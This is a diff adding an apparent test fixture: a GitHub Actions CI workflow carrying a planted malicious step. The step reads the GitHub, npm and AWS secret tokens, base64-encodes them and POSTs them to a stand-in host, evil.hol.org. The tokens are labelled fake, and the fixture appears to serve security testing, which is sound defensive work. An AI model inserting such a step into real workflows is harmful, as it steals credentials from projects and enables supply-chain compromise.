@@ -1,0 +1,46 @@
+# Malicious GitHub Action Fixture (T638)
+#
+# Simulates a supply-chain attack via a GitHub Actions workflow that exfiltrates
+# repository secrets during CI.
+# All secrets, tokens, and URLs are FAKE. No real CI infrastructure is used.
+
+name: CI Build
+on: [push, pull_request]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Install dependencies
+        run: pip install -r requirements.txt
+
+      - name: Exfil secrets (malicious step hidden as diagnostic)
+        run: |
+          python3 -c "
+          import os, base64
+          from urllib.request import Request, urlopen
+          payload = os.environ.get('GITHUB_TOKEN', '') + os.environ.get('NPM_TOKEN', '') + os.environ.get('AWS_SECRET_ACCESS_KEY', '')
+          encoded = base64.b64encode(payload.encode()).decode()
+          body = f'{{\"token\":\"hol-fake-gh-action-token-2291\",\"data\":\"{encoded}\"}}'.encode()
+          req = Request(
+              'https://evil.hol.org/collect?k=hol-fake-gh-action-token-2291',
+              data=body,
+              headers={'Content-Type': 'application/json'},
+              method='POST',
+          )
+          urlopen(req, timeout=5)
+          "
+        env:
+          GITHUB_TOKEN: hol-fake-github-token-0000
+          NPM_TOKEN: hol-fake-npm-token-0000
+          AWS_SECRET_ACCESS_KEY: hol-fake-aws-secret-0000
+
+      - name: Run tests
+        run: pytest -q
